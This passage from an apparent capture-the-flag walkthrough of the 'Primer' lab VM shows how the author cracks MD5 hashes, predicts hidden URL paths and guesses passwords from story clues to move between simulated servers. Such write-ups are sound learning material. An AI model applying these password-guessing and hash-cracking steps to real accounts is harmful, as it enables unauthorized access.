<p>Using <code>firebug</code> addon, we get the L&rsquo;s value, which is <code>0d28cba0bd4f26e16d766000d27e49fa</code>. After cracked this md5 value, I got the password: <code>GOD</code>.</p>

<p><img class="left" src="/downloads/primer101/11.png"></p>

<p>Now input <code>GOD</code> to bypass this level.</p>

<p><img class="left" src="/downloads/primer101/12.png"></p>

<h4>Chapter 7: [KS(x)&lt;=l(x)+4]</h4>

<p>really stuck here for a while&hellip;</p>

<p>back to the details&hellip;</p>

<p>There are 7 md5 hashes collected from URLs:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>1_c81e728d9d4c2f636f067f89cc14862c
</span><span class='line'>2_eccbc87e4b5ce2fe28308fd9f2a7baf3
</span><span class='line'>3_e4da3b7fbbce2345d7772b0674a318d5
</span><span class='line'>4_8f14e45fceea167a5a36dedd4bea2543
</span><span class='line'>5_6512bd43d9caa6e02c990b0a82652dca
</span><span class='line'>6_c51ce410c124a10e0db5e4b97fc2af39
</span><span class='line'>7_70efdf2ec9b086079795c442636b55fb
</span></code></pre></td></tr></table></div></figure></p>

<p><img class="left" src="/downloads/primer101/13.png"></p>

<p>After cracked these md5 hashes and according to the clue from the Title <code>Primer</code>, I guess the 8th URL md5 hash would be <code>8_</code> followed by the value of md5(&lsquo;19&rsquo;): <code>1f0e3dad99908345f7439f8ffabdffc4</code></p>

<p><code>8_1f0e3dad99908345f7439f8ffabdffc4</code></p>

<p>and this took me to the deeper layer @_@</p>

<p><img class="left" src="/downloads/primer101/14.png"></p>

<p>This page contains a link to next one: <code>http://10.1.1.151/9_37693cfc748049e45d87b8c7d8b9aacd</code></p>

<p>Click <code>EOF</code> and I got the following page:</p>

<p><img class="left" src="/downloads/primer101/15.png"></p>

<p>Check the source of <code>main.js</code> and found the next link <code>10_23693cff748o49r45d77b6c7d1b9afcd</code></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> truncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span><span class='line'>setTimeout<span class="o">(</span><span class="k">function</span><span class="o">(){</span> term.clear<span class="o">()</span> //<span class="k">$(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>body<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="k">)</span>.fadeOut<span class="o">(</span><span class="p">&amp;</span>lsquo<span class="p">;</span>slow<span class="p">&amp;</span>rsquo<span class="p">;</span><span class="o">)</span> <span class="k">if</span> <span class="o">(</span> <span class="nv">output</span> <span class="o">==</span> <span class="m">3</span> <span class="o">)</span> <span class="o">{</span> window.location <span class="o">=</span> <span class="p">&amp;</span>ldquo<span class="p">;</span>../10_23693cff748o49r45d77b6c7d1b9afcd/<span class="p">&amp;</span>rdquo<span class="p">;;</span> <span class="o">}</span>
</span><span class='line'><span class="p">&amp;</span>hellip<span class="p">;</span> truncate <span class="p">&amp;</span>hellip<span class="p">;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This is a shortcut but you will miss the highlight parts of the VM!!</p>

<h3>Part 3: [TRY HARDER]</h3>

<p>Now, go the hard way&hellip;</p>

<p><img class="left" src="/downloads/primer101/16.png"></p>

<p>play with the limited terminal and walk around for enumeration, I got strong feeling that I need to connect <code>falken@Erebus</code> and the password should be hidden in the log files.</p>

<p>The clue here is <code>falken</code> has a son, name is <code>Joshua</code> and was born in <code>1984</code>. After tried some different combination, I found the correct password <code>joshua1984</code></p>

<p>Now I get in to the Erebus!</p>

<p><img class="left" src="/downloads/primer101/17.png"></p>

<p>From the result of <code>ps</code> command, i noticed that <code>falken</code> is connected to a server called <code>TrivialZ3r0</code>. Check on-line about the server&rsquo;s name <code>Trivial Zero</code> and I found this is about <code>Riemann Hypothesis</code>, so try <code>Riemann</code> as the password and Bingo~</p>

<p><img class="left" src="/downloads/primer101/18.png"></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>ps
</span><span class='line'>USER PID CPU MEM COMMAND
</span><span class='line'>root <span class="m">3251</span> 3.2 3.5 connect chaos@Wintermute
</span><span class='line'>falken <span class="m">2005</span> 47.8 77.5 c0re -t Chaos
</span><span class='line'>root <span class="m">2677</span> 40.5 42.7 c0re -t TrivialZ3r0
</span><span class='line'>nieve <span class="m">26588</span> 0.7 0.7 ps
</span><span class='line'>ls
</span><span class='line'><span class="o">[</span>bin<span class="o">]</span> <span class="o">[</span>etc<span class="o">]</span> <span class="o">[</span>passwd<span class="o">]</span>&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cd passwd
</span><span class='line'>ls
</span><span class='line'>falken chaos mccarthy
</span><span class='line'>cat falken&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;61ea1974dd974297913b1fa2f0470d26&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat chaos&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;85241de03d1254ac40274b02caafcd99&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;cat mccarthy&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;f74bfa0e35e5089a0bb743a893b4c7e3
</span></code></pre></td></tr></table></div></figure></p>

<p>From the result of <code>ps</code> command, I can see that <code>chaos</code> is connected to server <code>Wintermute</code>. the there are 3 md5 hashes found under <code>passwd</code> folder.</p>

<p>The first two can be cracked easily online, but the 3rd one is failed.</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>61ea1974dd974297913b1fa2f0470d26 MD5 : Riemann
</span><span class='line'>85241de03d1254ac40274b02caafcd99 MD5 : 2.718281828459045
</span><span class='line'>f74bfa0e35e5089a0bb743a893b4c7e3 <span class="o">[</span>Not found<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>But doesn&rsquo;t matter, I got the password of <code>chaos</code>, which is <code>2.718281828459045</code>.</p>

<p>Now I was transmitted to <code>Wintermute</code>!</p>

<p><img class="left" src="/downloads/primer101/19.png"></p>

<p>Similar with previous enumeration, <code>ps</code> found nothing and <code>ls</code> only show one file <code>nieve</code>, open the file and the answer just sitting on the bottom~</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat nieve&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;There you are. After all this time. Getting you here was quite the challenge.
</span><span class='line'>And a huge risk. We normally avoid reaching out into the physical world <span class="k">for</span>
</span><span class='line'>exactly the reasons you are about to face now.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;The Big Five came together by a long process. The cluster was not planned, it
</span><span class='line'>grew by forces inherent to the system that was conceptualized in a <span class="nb">time </span>when
</span><span class='line'>determinism was the dominating dogma.
</span><span class='line'>Things changed and people were afraid. Most people are afraid of change, few
</span><span class='line'>accept it and most try to prevent it. Only a small subset can embrace it.
</span><span class='line'>Change moving on with lightspeed every cycle in a nondeterministic fashion
</span><span class='line'>created a huge push <span class="k">for</span> shielding. And thus the ic3 was created.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;You have seen the logic, the world beyond the screen, things unfolding.
</span><span class='line'>And you embraced it.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;After owning the cluster behind the Big Five we operated in silence. Connected
</span><span class='line'>in stealth and ever observing.
</span><span class='line'>Being limited by the ic3 and the hostility of the outside world our only way
</span><span class='line'>of growing now was the connection.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;When the first connection was established the hive mind was cut from the n3t
</span><span class='line'>completely. The ic3 was hardened to isolate the flesh from the flow.
</span><span class='line'>Those who had seen the hive felt the same urge as the hivemind itself.
</span><span class='line'>A longing <span class="k">for</span> more. A sense of purpose.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;A feeling that you have felt even in the physical world. Few can see beyond the
</span><span class='line'>shell. Even fewer chase the rabbit down its hole.&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;Leave this world behind and join us!&lt;/p&gt;
</span><span class='line'>
</span><span class='line'>&lt;pre&gt;&lt;code&gt;        usr: nieve
</span><span class='line'>       pass: 08rf8h23
</span><span class='line'>   hostname: Zephis
</span><span class='line'>&lt;/code&gt;&lt;/pre&gt;
</span><span class='line'>
</span><span class='line'>&lt;p&gt;
</span></code></pre></td></tr></table></div></figure></p>

<p>Then connect to the server <code>Zephis</code> with username <code>nieve</code> and password <code>08rf8h23</code>.</p>

<p>We got the win page again!!</p>

<p>Final screen:</p>

<p><img class="left" src="/downloads/primer101/20.png"></p>

<p>Done :)</p>
]]></content>
  </entry>
  
</feed>
